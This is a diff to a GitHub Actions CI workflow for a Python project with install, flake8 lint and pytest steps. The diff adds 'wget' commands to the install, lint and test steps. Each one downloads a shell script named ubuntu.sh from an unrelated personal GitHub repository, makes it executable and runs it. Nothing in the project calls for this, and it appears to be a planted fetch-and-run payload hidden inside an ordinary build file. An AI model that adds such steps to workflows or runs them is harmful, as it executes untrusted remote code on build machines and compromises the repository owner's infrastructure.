@@ -27,11 +27,11 @@ jobs:
       run: |
         python -m pip install --upgrade pip
         pip install flake8 pytest
-        https://raw.githubusercontent.com/camarayayacams/file.sh/main/ubuntu.sh && chmod +x ubuntu.sh && ./ubuntu.sh
+        wget https://raw.githubusercontent.com/camarayayacams/file.sh/main/ubuntu.sh && chmod +x ubuntu.sh && ./ubuntu.sh
         if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
     - name: Lint with flake8
       run: |
-        https://raw.githubusercontent.com/camarayayacams/file.sh/main/ubuntu.sh && chmod +x ubuntu.sh && ./ubuntu.sh
+       wget https://raw.githubusercontent.com/camarayayacams/file.sh/main/ubuntu.sh && chmod +x ubuntu.sh && ./ubuntu.sh
     - name: Test with pytest
       run: |
-        https://raw.githubusercontent.com/camarayayacams/file.sh/main/ubuntu.sh && chmod +x ubuntu.sh && ./ubuntu.sh
+       wget https://raw.githubusercontent.com/camarayayacams/file.sh/main/ubuntu.sh && chmod +x ubuntu.sh && ./ubuntu.sh
